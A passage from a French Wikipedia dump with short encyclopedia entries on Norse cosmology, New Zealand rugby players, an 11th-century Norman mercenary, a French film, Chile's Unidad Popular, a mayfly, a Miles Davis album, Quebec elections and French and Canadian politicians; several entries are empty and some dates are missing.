La structure de l'Univers n'est pas précisément décrite une fois pour toutes et varie parfois d'un ouvrage à l'autre. De plus certains manuscrits très anciens ayant bénéficié de traductions différentes, contenant parfois des erreurs de copie ou même difficiles à lire rendent la tâche encore plus ardue. La confusion concerne uniquement le monde de Niflheim, qui a parfois été associé au monde « Niflheimr », celui-ci étant le monde originel du froid et de la brume duquel est né l'Univers (par association avec Muspellheim, monde du feu et de la chaleur). L'interprétation choisie ici est que Niflheim (également appelé Niflhel, « la Hel sombre ») est le niveau le plus profond de l'Univers. Il s'agit de la version la plus communément acceptée.
Une fois cette clarification effectuée, les neuf Mondes peuvent être organisés différemment de manière « spatiale » dans l'Univers.
Système linéaire.
Cette organisation décrit les mondes comme un continuum avec à l'extrémité Nord, Niflheim, monde du froid, du vent et de la brume, et à l'extrémité Sud, Muspellheim, monde de la chaleur et du feu. Ils s'organisent alors ainsi :
Sud
Nord
Cette organisation conforte l'idée que Hel (ou Helheim) ne serait que « l'anti-chambre » de Niflheim, lui-même étant le monde situé au plus profond de l'Univers, comme décrit dans l'Edda de Snorri et désigné comme le neuvième monde.
Trois niveaux de trois mondes.
Dans cette organisation, l'Univers serait structuré sur trois niveaux de l'Arbre du Monde Yggdrasil, chacun comportant trois mondes différents. La configuration en serait la suivante :
Niveau le plus haut, dans le ciel :
Niveau du milieu, sur la terre :
Niveau inférieur, sous la terre :
C'est en particulier l'organisation donnée par la religion du néopaganisme Ásatrú, qui voue un culte aux Ases basé sur la mythologie nordique.

</doc>
<doc id="568837" url="https://fr.wikipedia.org/wiki?curid=568837" title="John Sherbrooke">
John Sherbrooke



</doc>
<doc id="568841" url="https://fr.wikipedia.org/wiki?curid=568841" title="Reuben Thorne">
Reuben Thorne

 Reuben David Thorne, né le à Christchurch, est un joueur de rugby à XV néo-zélandais qui a joué 50 fois avec les All-Blacks entre 1999 et 2007, dont 23 fois comme capitaine. Il évolue habituellement au poste de troisième ligne aile "côté fermé" (N°6). Il mesure 1,92 m et pèse 107 kg.
Carrière.
En club.
Il débute au plus haut niveau en 1996 avec la province de Canterbury en NPC. Il disputera 71 matchs sur un total de 14 saisons.
Il fait ses débuts en Super Rugby en 1997 avec la franchise des Crusaders.
Thorne devient capitaine de la franchise à partir de 2002, terminera sa première saison invaincu.
Il joue avec les Crusaders jusqu'en 2008, date à laquelle il part jouer en Top League japonaise chez les Yamaha Júbilo pour deux saisons, avant de prendre sa retraite en 2009.
Il effectue un retour inattendu sur les terrains en 2011 avec son ancienne équipe des Crusaders, à la suite de très nombreuses blessures dans le groupe dans le cadre d'une tournée en Afrique du Sud. Il est sur le banc lors du match contre les Cheetahs mais ne rentre pas en jeu. Il termine définitivement sa carrière en 2011, avec Canterbury en ITM Cup.
En équipe nationale.
Il a débuté au niveau international avec l’équipe A de Nouvelle-Zélande.
Thorne a fait ses débuts avec les Blacks en à l’occasion d’un match contre les Springboks. Il a été pour la première fois capitaine contre l'Italie le . En tant que capitaine des Blacks, il a remporté le Tri-nations en 2002 et 2003. Capitaine des All Blacks lors de la Coupe du monde 2003, il est en retrait de la sélection jusqu'en 2006. Bien qu'il ne soit plus ni capitaine (sauf lors d'un intérim contre le Canada en ) ni titulaire, il est retenu dans l'effectif néo-zélandais pour la Coupe du monde 2007. Cette sélection va essuyer de nombreuses critiques en Nouvelle-Zélande, notamment liées au fait que Thorne n'est pas en forme (il sera blessé lors de la Coupe du monde), et que beaucoup le considère comme un joueur lent, peu en phase avec le jeu des "Blacks". Il prendra sa retraite internationale à l'issue de la compétition.
Style de jeu.
Joueur polyvalent, capable de jouer à tous les postes de la troisième ligne mais aussi comme seconde ligne, Thorne est un travailleur de l'ombre, dont le rôle se situe autour et dans les regroupements et consiste à permettre la sortie "propre" des ballons.
Statistiques en équipe nationale.
De 1999 à 2007, Reuben Thorne compte 50 sélections avec les "All-Blacks", inscrivant 25 points, soit 5 essais. Avec les "Kiwis", il dispute sept éditions du Tri-nations en 1999, 2000, 2001, 2002, 2003, 2006 et 2007. Il a disputé la coupe du monde de rugby 1999 (quatrième) , la Coupe du monde de rugby 2003 (troisième) et la Coupe du monde 2007 (quart de finaliste). Il compte 6 sélections en 1999, 5 en 2000, 8 en 2001, 8 en 2002, 14 en 2003, 1 en 2004, 4 en 2006 et 6 en 2007.

</doc>
<doc id="568842" url="https://fr.wikipedia.org/wiki?curid=568842" title="Don Taylor (acteur)">
Don Taylor (acteur)



</doc>
<doc id="568845" url="https://fr.wikipedia.org/wiki?curid=568845" title="Marie-Catherine Le Jumel de Barneville">
Marie-Catherine Le Jumel de Barneville



</doc>
<doc id="568848" url="https://fr.wikipedia.org/wiki?curid=568848" title="Chiffre arabe">
Chiffre arabe



</doc>
<doc id="568855" url="https://fr.wikipedia.org/wiki?curid=568855" title="Thym citronné">
Thym citronné



</doc>
<doc id="568856" url="https://fr.wikipedia.org/wiki?curid=568856" title="Thymus x citriodorus">
Thymus x citriodorus



</doc>
<doc id="568859" url="https://fr.wikipedia.org/wiki?curid=568859" title="Thymus citriodorus">
Thymus citriodorus



</doc>
<doc id="568862" url="https://fr.wikipedia.org/wiki?curid=568862" title="Hugues Tubœuf">
Hugues Tubœuf

Hugues Tubœuf, né avant l'an 1020, est un aventurier normand qui se rendit en Italie méridionale, probablement autour de l'an 1035, à la recherche de gloire mais surtout de richesses.
Biographie.
Banni du duché de Normandie ou choisissant l'exil volontaire, Hugues Tubœuf sert comme mercenaire dans une Italie du Sud instable et divisée, et en cette qualité, fait partie du contingent composé de 300 guerriers normands chargés de guerroyer en Sicile contre les musulmans, à la solde des Byzantins du général Georges Maniakès (1038-1040). La tentative de reconquête byzantine échoue; les Normands, dont Hugues Tubœuf, se révoltent contre Byzance à propos de leurs conditions et de leurs soldes, lâchent Maniakès et décident de combattre pour leur propre compte.
En septembre 1042, à Matera (ou Melfi), il fait partie des chefs normands qui participent à l'élection comme chef de Guillaume de Hauteville dit « Bras-de-Fer », ainsi que des 12 « barons » normands qui se partagent l'Apulie byzantine, dont le Nord a déjà été conquis par eux entre 1040 et 1042. Parmi ces barons se trouvent notamment le Breton Tristan, qui reçoit en fief Montepeloso, Pierron, qui reçoit Trani, tandis que Hugues reçoit la cité de Monopoli, dans la région de Bari.
Hugues Tubœuf est surtout passé à la postérité pour cet épisode fameux relevé par les chroniqueurs contemporains, impressionnés par la force physique des guerriers normands et par leur sauvagerie à la guerre : en 1043, à la veille de la bataille de Venosa opposant les bandes normandes aux troupes byzantines, un envoyé byzantin vint parlementer avec des chefs normands, proposant des offres de paix. Pour seul réponse, l'un de ces Normands, Hugues, donna un violent coup de poing au cheval de l'ambassadeur, l'assommant net. Les ambassadeurs furent renvoyés et la bataille se déroula le lendemain : les Normands, pourtant peu nombreux, furent victorieux :
« "Sed cum sine castro, quo se tuerentur a parte illius, incolis essent, castrum quod Melfa dicitur, construxerunt, ubi, cum quingenti tantummodo milites essent, Graeci, qui terrae illi principabantur, maxima multitudine ex Calabria et Apulia sibi coadunata, usque ad sexaginta millia armatorum, ut eos a finibus suis propellerent, versus illos ire coeperunt; legatoque praemisso, mandant, ut quod mallent eligant: aut certamen in crastino secum habere, aut, pace sibi indulta, incolumes a praedictis finibus recedere. Legatus vero qui ad hoc missus fuerat, cum pulcherrimo equo insideret, quidam normannus, Ugo, cognomento Tudebusem, equum manu attrectare coepit: et, ut mirabile aliquid de se sociisque suis, unde terrerentur, Graecis nunciaretur, nudo pugno equum in cervice percutiens, uno ictu quasi mortuum deiecit. Reliqui vero Normanni prosilientes graecum, qui cum equo deiectus fuerat et, solo timore laesus, quasi exanimis humi iacebat, erigunt; equum autem, usque ad quoddam praecipitium pertrahentes, deiciunt. Porro graecus, cum vix consolatione Normannorum ad mentem rediisset, meliori equo ab eis accepto, certamen paratum sociis refert. Sed cum quod acciderat principibus populi sui tantum retulisset, illi admiratione et metu percussi, verbum inter se comprimebant, ne forte, si in propatulo diceretur, exercitus territus refugeret. Mane itaque facto, summo diluculo a Normannis occurritur fortiterque congredientes, acerrime utrinque pugnatur. Intererant huic certamini de filiis Tancredi, Willelmus Ferreabrachia et comes Drogo: nam necdum quisquam fratrum eos subsecutus fuerat. Isti vero, ut fortissimi milites socios animantes, sed et ipsimet fortiter agentes, multis ex hostibus prostratis, tandem in fugam reliquos dederunt, quos insequentes et posteriores quosque caedentes, victoriam obtinuerunt, multis ex hostibus in flumine quod Olivetum dicitur, dum transnatare cupiunt, submersis…" », Gaufridus Malaterra, circa annum 1099.

</doc>
<doc id="568863" url="https://fr.wikipedia.org/wiki?curid=568863" title="Carl Hoeft">
Carl Hoeft

&lt;dfn&gt;Carl Henry Hoeft&lt;/dfn&gt;, né le à Auckland, est un joueur de rugby à XV néo-zélandais qui a joué 31 fois avec les All-Blacks de 1998 à 2003 évoluant au poste de pilier. Il a évolué au Castres olympique de 2005 à 2011.
Biographie.
Hoeft débute au haut niveau avec les scolaires de Nouvelle-Zélande (1992), avec Jonah Lomu, Jeff Wilson et Carlos Spencer. Il joue ensuite avec l’équipe de Nouvelle-Zélande des moins de 21 ans, avec, à ses côtés en première ligne, Kees Meeuws et Anton Oliver, avec lesquels il joue souvent dans l’équipe des Otago Highlanders et les Blacks. Il débute en NPC avec l’équipe de Thames Valley en 1994. Il reste deux saisons puis rejoint l'équipe provinciale d'Otago en 1996. L'année suivante, il fait ses débuts dans le Super 12 avec les Highlanders. Il obtient sa première cape avec les ' en juin 1998 à l’occasion d’un match contre l'équipe d'Angleterre. Il dispute la coupe du monde de rugby 1999 où les ' terminent quatrièmes. En 2002, il est en concurrence au poste de pilier avec Joe McDonnell. Il dispute son dernier test match lors de la petite finale pour la troisième place de coupe du monde 2003 gagnée contre l'équipe de France en novembre 2003.
En 2005, il rejoint la France et s'engage avec le Castres olympique pour deux saisons. Il y reste six années puis signe un contrat avec le Stade toulousain comme joker coupe du monde au mois de mai 2011.
Statistiques.
En équipe nationale.
De 1998 à 2003, Carl Hoeft compte 30 sélections avec les "All-Blacks". Avec les "Kiwis", il dispute cinq matchs de Coupe du monde lors de l'édition 1999 (Tonga, Angleterre, Écosse, France, Afrique du Sud) et deux lors de l'édition 2003 (Canada, France). Il participe à quatre éditions du Tri-nations en 1998 (2 sélections), 1999 (3 sélections), 2000 (4 sélections) et 2001 (4 sélections).

</doc>
<doc id="568870" url="https://fr.wikipedia.org/wiki?curid=568870" title="Nathalie...">
Nathalie...

Nathalie… est un film français réalisé par Anne Fontaine, sorti le . Il a fait l'objet du remake "Chloé", réalisé par Atom Egoyan et sorti en 2009 aux États-Unis.
Synopsis.
Catherine (Fanny Ardant), gynécologue, découvre que son mari Bernard (Gérard Depardieu), homme d'affaires, l'a trompée. Celui-ci le reconnait, mais affirme que ces passades sont ponctuelles et insignifiantes, et sans doute la conséquence de leur relation qui s'est étiolée au fil des ans. Catherine n'est pas réellement en colère mais plutôt intriguée à l'idée que son mari ait des relations extra-conjugales. Elle engage une hôtesse de bar (Emmanuelle Béart), prénommée Marlène, pour séduire Bernard et lui rapporter ses réactions. Catherine lui attribue le prénom "Nathalie" sous lequel Marlène agira.
Les deux femmes se voient presque quotidiennement et Marlène raconte en détail chacun de ses rendez-vous avec Bernard, employant des mots crus pour décrire leurs ébats, ce qui fascine Catherine et change le regard qu'elle porte sur son époux chaque soir. D'autant que Bernard persiste dans le mensonge. La relation ambiguë entre Catherine et Marlène / Nathalie se transforme peu à peu en amitié. À plusieurs reprises le contrat est rompu mais Catherine maintient cette situation et retourne inexorablement vers l'hôtesse. 
Lorsque Marlène est expulsée de son logement, Catherine lui loue un appartement afin qu'elle reste dans le quartier. Un jour Marlène avoue qu'elle a pris du plaisir avec Bernard. Catherine décide alors de tromper son mari. Mais lorsque Marlène lui annonce que Bernard veut vivre avec elle, cela va trop loin pour Catherine. Pour la première fois elle interroge Bernard explicitement, mais celui-ci jure qu'il n'a aucune autre femme dans sa vie.
Perplexe devant cette sincérité, Catherine entraîne son mari dans le bistrot où elle rencontrait régulièrement Nathalie, et donne simultanément rendez-vous à cette dernière. Quand Marlène / Nathalie pénètre dans l'établissement et aperçoit le couple, elle quitte les lieux. Bernard ne connaît visiblement pas cette fille, et Catherine comprend alors la situation. Marlène avoue qu'elle a tout inventé : elle n'a jamais couché avec Bernard et ne l'a en fait aperçu qu'une seule fois, sans que celui-ci ne prête attention à elle. Catherine ne lui en veut pas de lui avoir menti et la serre tendrement dans ses bras.
Production.
Choix des interprètes.
La chanteuse et comédienne Vanessa Paradis avait été pressentie pour incarner le rôle de Nathalie. Cependant, elle dut y renoncer en raison de sa grossesse. C'est ainsi que le rôle échut à Emmanuelle Béart.
Tournage.
Le film a été tourné à Paris et en région parisienne, notamment à l'angle des rues du Marais, Charles et Beautreillis, et à la patinoire de Franconville.

</doc>
<doc id="568871" url="https://fr.wikipedia.org/wiki?curid=568871" title="Mentha x piperita">
Mentha x piperita



</doc>
<doc id="568872" url="https://fr.wikipedia.org/wiki?curid=568872" title="Mentha piperita">
Mentha piperita



</doc>
<doc id="568873" url="https://fr.wikipedia.org/wiki?curid=568873" title="Evelyne Dhéliat">
Evelyne Dhéliat



</doc>
<doc id="568874" url="https://fr.wikipedia.org/wiki?curid=568874" title="Unité populaire (Chili)">
Unité populaire (Chili)

L'Unité populaire (, abrégé en UP) est une coalition entre les partis de centre gauche et de gauche du Chili ayant pour but l'élection de Salvador Allende à la présidence de la République le , et en remplacement du Front d'action populaire.
Programme.
Le programme de l'UP fut signé à Santiago, le par le Parti socialiste, le Parti communiste, le Parti social-démocrate, le Mouvement d'action populaire unitaire (MAPU) et l'Action populaire indépendante (API). La gauche chrétienne se joint à l'UP en 1970. L'Unité populaire fut aussi appuyée par la Fédération syndicale nationale et par la Centrale unique des travailleurs (CUT). Les partis politiques étaient représentés à la Commission politique de l'UP. Pour les sympathisants indépendants on mit en place les CUP (Comités de l'Unité Populaire).
Un des principaux problèmes fut la désignation du candidat de la gauche : Salvador Allende était le candidat logique (trois campagnes présidentielles : 1952, 1958 et 1964), mais le Parti Socialiste était réticent à le soutenir. Le Parti Communiste avait proposé comme candidat Pablo Neruda. Ce n'est que le que l'UP accepta la candidature d'Allende.
S'appuyant sur la critique de l'action gouvernementale d'Eduardo Frei Montalva, le programme de gouvernement de l'UP est détaillé dans "Le programme de base de l'Unité Populaire et Les 40 premières mesures du Gouvernement Populaire". Cela permettait de concrétiser, en parallèle avec l'action d'Allende conseillé par Joan Garcés, la voie chilienne d'accession au socialisme («"la revolucion con vino tinto y empanadas "» selon la formule d'Allende). C'était postuler la possibilité pour un pays capitaliste sous-développé d'effectuer une transition démocratique et non-violente dans son cheminement vers le socialisme : cette étape faciliterait et créerait les conditions optimales pour arriver au socialisme. À cela s'ajoutait le respect de la légalité de l'État ; plus besoin de compter sur un parti unique puisque le processus pouvait s'appuyer sur une coalition de toutes les forces démocratiques qui souhaitaient des changements tant au niveau de la société que du fonctionnement démocratique. Sous certains aspects, c'était la tentative de créer un nouveau bloc hégémonique dans la lignée d'Antonio Gramsci. La voie chilienne au socialisme pensait l'établissement du socialisme par les instances étatiques chiliennes possible, et ne recourrait pas à la stratégie de la lutte armée qui s'était propagée en Amérique latine entre 1960 et 1970.
Mesures.
Les mesures du gouvernement furent la participation des travailleurs dans les entreprises (cogestion), l'accélération de la réforme agraire afin d'en finir avec les propriétés latifundiaires, l'augmentation des salaires, la nationalisation des banques et de certaines entreprises, la nationalisation du cuivre, et la distribution d'un demi-litre de lait par enfant chaque jour. L'opposition du Congrès National ne permit pas la création de trois niveaux de propriété : social, mixte et privée.
La première année, l'inflation passe de 35 % à 22,1 %, et le PIB progresse de 8,3 %. Le chômage diminue de moitié, et reste faible pendant toute la durée du gouvernement de l'Unidad Popular. De nouvelles libertés sont acquises, comme le droit au divorce (qui sera par la suite supprimé par la dictature militaire). Mais les réformes sociales impulsées par le gouvernement générèrent un déficit fiscal. Pour pouvoir continuer à financer ces réformes, le gouvernement opta pour l'impression de billets : ce qui eut pour conséquence, avec d'autres facteurs, d'alimenter l'inflation.
Cependant la UP fut divisée entre la voie légale d'accession au socialisme (définie par Allende, le Parti Communiste, les radicaux du Parti Socialiste et le MAPU) et la tentation d'une avancée plus radicale (défendue par certains courants du PS et du MAPU, et à l'extérieur de l'UP par le MIR).
Évolution.
De telles contradictions firent qu'en 1973 l'UP n'existait plus comme alliance politique effective : la relation entre les différentes composantes était paralysée, donc l'UP préféra les relations directes avec le président Allende.
Après le coup d'État du 11 septembre 1973, qui renversa l'Unidad Popular et mis en place une dictature militaire, le Comité Politique de l'Unité Populaire continua à exister en exil, mais sous forme symbolique ; chaque parti définit sa propre stratégie afin de lutter contre le Gouvernement Militaire. Cela n'empêcha pas l'existence d'un Secrétariat Exécutif Officiel établi en République Démocratique Allemande et dirigé par Clodomiro Almeyda.
L'UP connut une grave crise suite du fractionnement du Parti socialiste en 1979 et fut dissoute définitivement en 1980.
Hommage.
Le , 25 députés frondeurs de Syriza du premier ministre Aléxis Tsípras, en désaccord avec l'accord trouvé par celui-ci avec les créanciers du pays, annoncent que pour les élections législatives anticipées du 20 septembre, ils quittent Syriza et forment un nouveau parti, l'Unité populaire, en hommage à Salvador Allende et au parti qui l'avait conduit au pouvoir.
Voir aussi.
L'hymne de l'UP était la chanson "Venceremos" dont le texte fut écrit par Claudio Iturra et la musique composée par Sergio Ortega :
« "Aquí va todo el pueblo de Chile"&lt;br&gt;
"aquí va la Unidad Popular",&lt;br&gt;
"campesino, estudiante y obrero"&lt;br&gt;
"compañeros de nuestro cantar."&lt;br&gt;
"Venceremos, venceremos,"&lt;br&gt;
"con Allende en septiembre a vencer".&lt;br&gt;
"Venceremos, venceremos,"&lt;br&gt;
"¡La Unidad Popular al poder!" »

</doc>
<doc id="568877" url="https://fr.wikipedia.org/wiki?curid=568877" title="Ephemera vulgata">
Ephemera vulgata

Ephemera vulgata est une espèce d'insectes appartenant à l'ordre des éphéméroptères.
Caractéristiques physiques.
"Ephemera vulgata" est généralement un peu plus sombre et un peu plus petite que sa cousine "Ephemera danica".
Localisation.
Dans les secteurs lents des rivières de deuxième catégorie et cours aval de grandes rivières, autrefois partout en Europe. Comme tous les éphémères, c'est une espèce qui est en voie de régression sur une grande partie de son territoire, probablement en raison de la pollution de l'eau, par les pesticides et les métaux lourds notamment, et en raison de la pollution lumineuse qui affecte fortement ces insectes au moment de l'émergence en groupe, si des luminaires sont situés à proximité des cours d'eau et allumés à ce moment.
Éclosion.
À partir de début juin et jusqu'à fin septembre, par groupes isolés.

</doc>
<doc id="568878" url="https://fr.wikipedia.org/wiki?curid=568878" title="Sprota">
Sprota

Sprota est l'épouse ou la « "frilla" » du duc , dit Guillaume Longue-Épée, en réalité jarl des Normands et comte de Rouen.
Biographie.
D'origines obscures, elle est dite « bretonne » par Flodoard de Reims et née vers 911. Sprota serait la fille du comte Juhel Bérenger de Rennes, hypothèse qui n'est pas reprise par Elisabeth van Houts pour qui son origine peut tout aussi bien être scandinave (comme l'indique le nom de "Sprota") ou franque. Selon l’ouvrage "Histoire du duché de Normandie" rédigé au début du , elle serait la fille d'Hébert comte de Senlis, mais cette thèse est abandonnée depuis longtemps.
Son mariage avec Guillaume s'est déroulé devant tous les seigneurs du duché et en présence du comte de Paris Hugues le Grand et beaucoup de jeunes seigneurs de France. Cela se déroule vers 932 dans le cadre du règlement des troubles en Bretagne, Cotentin et Avranchin. Sprota aurait été envoyée à Rouen en 931 pour échapper au révolté Rioulf.
De cette union avec Guillaume naît, vers 933, le futur duc Richard Sans-Peur.
À la mort de Guillaume, assassiné le , elle est donnée comme "frilla", à un riche noble normand nommé Asperleng de Pîtres. De cette union, naît Raoul d'Ivry (demi-frère du duc Richard Sans-Peur), celui qui mate violemment la révolte paysanne dans les années 996-997 sous la minorité de son neveu, le jeune duc .

</doc>
<doc id="568879" url="https://fr.wikipedia.org/wiki?curid=568879" title="In a Silent Way">
In a Silent Way

 (1969) est un album du compositeur et trompettiste de jazz américain Miles Davis.
Historique.
Malgré le calme envoûtement de ses tempos, "" a une portée révolutionnaire dans l'histoire du jazz : il introduit et popularise un nouveau style, le jazz fusion (aussi appelé jazz-rock ou jazz électrique), que Miles affinera dans son album suivant, "Bitches Brew" (1970).
La version originale est un disque LP constitué de quatre compositions organisées en deux longues suites, une sur chaque face. Miles Davis, comme à son habitude, s'est entouré de jeunes et brillants musiciens qui, plus tard, continueront leur carrière dans la même veine.
Si l'on compare ce groupe à celui qui s'affichait sur l'album précédent, on note l'arrivée du bassiste Dave Holland (en remplacement de Ron Carter) et surtout la participation de John McLaughlin et Joe Zawinul, dont la guitare et les claviers électriques donnent à l'album sa sonorité caractéristique et visionnaire. Joe Zawinul signe le titre qui donne son nom à l'album, ".
" est aussi le premier disque de Miles Davis où le producteur, Teo Macero, prend une place artistique importante, en dirigeant un savant collage et mixage d'extraits des prises originales (on entend clairement un point de montage, par exemple, sur le titre "In a Silent Way", à 9 min 10 s)
Citation.
L'anecdote est à prendre avec prudence. Une première prise du morceau avait été faite où "in a silent way" était joué sur un rythme de bossa nova.
Distinction.
En 2001, l'album reçoit le Grammy Hall of Fame Award.
Détails du mixage.
La version éditée sur l'album original de "Shhh/Peaceful" provient du montage d'extraits de la prise originale comme suit :
La version éditée de "In a Silent Way/It's About That Time" est un montage d'extraits des prises originales comme suit :
On peut entendre les prises originales dans le coffret "The Complete In a Silent Way Sessions" (2001).

</doc>
<doc id="568880" url="https://fr.wikipedia.org/wiki?curid=568880" title="Élections générales québécoises de 1875">
Élections générales québécoises de 1875

L'élection générale québécoise de 1875 est tenue le afin d'élire à l'Assemblée législative du Québec les députés de la . Il s'agit de la générale dans cette province depuis la confédération canadienne de 1867. Le Parti conservateur du Québec, dirigé par Charles-Eugène Boucher de Boucherville, est reporté au pouvoir, formant un troisième gouvernement majoritaire consécutif.
Contexte.
À Ottawa, le scandale du Pacifique a fait chuter le gouvernement fédéral libéral-conservateur de John A. Macdonald et placé au pouvoir les libéraux d'Alexander Mackenzie. George-Étienne Cartier, dont la santé déclinait depuis quelques années, est décédé en 1873 ; Hector-Louis Langevin le remplace comme chef de file des conservateurs au Québec.
Pierre-Joseph-Olivier Chauveau avait démissionné comme Premier ministre en 1873 pour continuer sa carrière à Ottawa. Gédéon Ouimet lui a succédé mais a dû démissionner à la suite du scandale des Tanneries. Charles-Eugène Boucher de Boucherville a été nommé à sa place et c'est lui qui dirige les conservateurs lors de la campagne électorale. Situation inhabituelle, il n'est pas député mais conseiller législatif. Henri-Gustave Joly de Lotbinière est toujours à la tête du Parti libéral du Québec. Les libéraux arrivent mal à se démarquer du libéralisme catholique, condamné par l'Église, ce qui contribue à la victoire des conservateurs.
Le découpage des circonscriptions est le même que lors de l'élection précédente. Cependant, une nouvelle loi électorale est entrée en vigueur en : le vote doit désormais se faire au scrutin secret, et doit se tenir en une seule journée à travers toute la province. La loi tente également de réduire la fraude électorale ainsi que les violences lors des campagnes électorales. Par contre, le cens électoral est maintenu.
Résultats.
Résultats par parti politique.
"Pour une liste complète des députés élus lors de cette élection, ainsi que les décès, démissions et élections partielles ayant eu lieu par la suite, veuillez consultez l'article du Québec."
Élus sans opposition : 13 conservateurs, 5 libéraux, 1 conservateur indépendant
Résultats par circonscription.
 
 

</doc>
<doc id="568883" url="https://fr.wikipedia.org/wiki?curid=568883" title="Guy Favreau">
Guy Favreau

Guy Favreau (-) est un avocat, un homme politique et un juge canadien.
Biographie.
Né à Montréal au Québec, fils de Léopold Favreau et de Béatrice Gagnon, il obtient un baccalauréat en arts et un baccalauréat en droit à l'Université de Montréal. Il est appelé au barreau du Québec en 1940. Il travaille comme avocat à Montréal de 1942 à 1952. En 1952, il devient membre de la commission sur les pratiques commerciales restrictives à Ottawa. En 1955, il devient assistant au sous-ministre de la Justice. Il aide à créer la faculté de droit civil à l'Université d'Ottawa et enseigne dans la même faculté. En 1960, il revient à Montréal pour travailler comme avocat privé.
Favreau est élu sous la bannière du Parti libéral dans la circonscription de Papineau lors de l'élection fédérale de 1963 et réélu dans l'élection de 1965. Il sert à titre de ministre de la citoyenneté et de l'immigration (1963-1964), ministre de la Justice et procureur général du Canada en 1964-1965. Le , il démissionne en tant que ministre de la Justice à la suite des tractations de l'affaire Rivard.
Il est président du Conseil privé de 1965 à 1967. De plus, il est le leader du gouvernement à la Chambre des communes ainsi que le chef des libéraux fédéraux québécois. Il est aussi à l'origine de la formule Fulton-Favreau.
Nommé juge à la cour supérieure du Québec le , il meurt le à Montréal de la même année à l'âge de 50 ans. Il a été enterré au Cimetière Notre-Dame-des-Neiges, à Montréal.
Le complexe Guy-Favreau, l'édifice principal du gouvernement fédéral à Montréal, est nommé en son honneur.

</doc>
<doc id="568886" url="https://fr.wikipedia.org/wiki?curid=568886" title="Élection générale du Québec, 1867">
Élection générale du Québec, 1867



</doc>
<doc id="568889" url="https://fr.wikipedia.org/wiki?curid=568889" title="Liste des élections générales au Québec">
Liste des élections générales au Québec



</doc>
<doc id="568891" url="https://fr.wikipedia.org/wiki?curid=568891" title="Élection générale du Québec, 1871">
Élection générale du Québec, 1871



</doc>
<doc id="568892" url="https://fr.wikipedia.org/wiki?curid=568892" title="Élection générale du Québec, 1875">
Élection générale du Québec, 1875



</doc>
<doc id="568893" url="https://fr.wikipedia.org/wiki?curid=568893" title="Thierry de Lorraine">
Thierry de Lorraine

Il y a eu plusieurs princes de la maison de Lorraine prénommés Thierry :

</doc>
<doc id="568895" url="https://fr.wikipedia.org/wiki?curid=568895" title="Première catégorie">
Première catégorie



</doc>
<doc id="568896" url="https://fr.wikipedia.org/wiki?curid=568896" title="Anicet Le Pors">
Anicet Le Pors

Anicet Le Pors, né le dans le de Paris, est un homme politique et conseiller d'État français.
Ingénieur de la Météorologie nationale et économiste de formation, Anicet Le Pors est docteur d'État en sciences économiques et diplômé du Centre d’étude des programmes économiques.
Il est l'un des quatre ministres communistes des deuxième et troisième gouvernements de Pierre Mauroy de 1981 à 1984. Détenteur du portefeuille de la Fonction publique et des Réformes administratives, il engage une réforme comprenant un nouveau statut des fonctionnaires, tendant à unifier les trois fonctions publiques (d'État, territoriale et hospitalière) et privilégiant l'accès aux emplois publics par la voie du concours. Il est conseiller d’État honoraire.
Biographie.
Carrière professionnelle.
Ancien élève de l'École nationale de la météorologie, promotion 1950, sa vie professionnelle débute en 1953 : ingénieur à la Météorologie nationale à Marrakech, puis à Casablanca, de 1957 à 1965, il effectue l’essentiel de sa carrière au service central de la Météorologie, quai Branly à Paris.
En 1953, il adhère à la CFTC, puis en 1955 prend sa carte à la CGT. En 1960, il représente l'Organisation météorologique mondiale (OMM) à Léopoldville (ex-Congo belge).
De 1965 à 1977, il est chargé de mission à la direction de la prévision du ministère de l’Économie et des Finances, chef du bureau de l’Industrie et en 1975 et 1976, chef de la mission interministérielle Immigration et développement économique et social (La Documentation française). En 1976 et 1977, il est chargé de cours à l’Université de Paris XIII, puis de 1978 à 1980, chargé de cours à l’École supérieure des sciences économiques et commerciales (ESSEC).
En 1985, il est nommé Conseiller d’État, membre de la section du contentieux et de la section des travaux publics. Il le reste jusqu'en 2000.
Carrière politique.
De 1953 à 1954, il est membre de Jeune République avant d’adhérer en 1958 au Parti communiste français (PCF) au lendemain du référendum du 28 septembre 1958. Pendant son séjour au Maroc, il milite au sein du mouvement Conscience française favorable à l'indépendance.
Élu au comité central du PCF en 1979, il en démissionne en 1993 et quitte le PCF en 1994. Il participe en 1990 au mouvement « Refondation » tendant à la transformation du Parti communiste français. Il se présente aux élections européennes de 1994 sur la liste « L'autre politique ». Cette liste conduite par Jean-Pierre Chevènement, Gisèle Halimi et Anicet Le Pors, se réclame de l'opposition de gauche au traité de Maastricht. Elle obtient 2,54 % ().
Mandats politiques.
En 1977, il est élu sénateur des Hauts-de-Seine (Groupe Communiste). Membre de la commission des finances, du contrôle budgétaire et des comptes économiques de la Nation, il prend part activement au travail de la commission d'enquête sur le naufrage de l’"Amoco Cadiz" en 1978.
Le , il est nommé ministre de la Fonction publique et des Réformes administratives, délégué auprès du Premier ministre. Il quitte le gouvernement le . En 1985, il est élu conseiller général des Hauts-de-Seine, élu dans le canton de Nanterre-Sud-Est. Réélu en 1992, il ne se représente pas en 1998.
Fonctions gouvernementales.
Anicet Le Pors est Ministre délégué auprès du Premier ministre, chargé de la Fonction publique et des Réformes administratives du gouvernement Mauroy II (du au ), puis Secrétaire d’État auprès du Premier ministre, chargé de la Fonction publique et des Réformes administratives du gouvernement Mauroy III (du au ).
Il donne en 1983 son nom à la loi portant droits et obligations des fonctionnaires. Cette loi approfondit la conception du fonctionnaire citoyen de plein droit  et généralise le système de la carrière. Elle sera complétée par trois autres lois, l’ensemble identifiant le statut d’une fonction publique unifiée « à trois versants » (État, collectivités territoriales, établissement publics hospitaliers). Il supprime les notions de « bonnes mœurs » et de « bonne moralité » du statut général des fonctionnaires. Un intérêt particulier est apporté au respect du principe d’égalité entre les femmes et les hommes ; ainsi est fortement réduit le nombre de concours distincts entre femmes et hommes en  raison de la nature ou des conditions déterminantes de l’exercice des fonctions. Une troisième voie d’accès à l’École nationale d’administration (ENA) est ouverte aux élus locaux, syndicalistes, dirigeants d’associations reconnues d’utilité publique ayant exercé des fonctions de haut niveau pendant une durée minimale. Dans le cadre des réformes administratives, si diverses initiatives et réformes ont pu être introduites, une charte prévue des relations entre l’administration et les citoyens n’a pu être menée à bien en raison de l’accentuation du caractère néolibéral du contexte général qui a provoqué un changement d’orientation politique sur le sujet.
Autres fonctions officielles et missions.
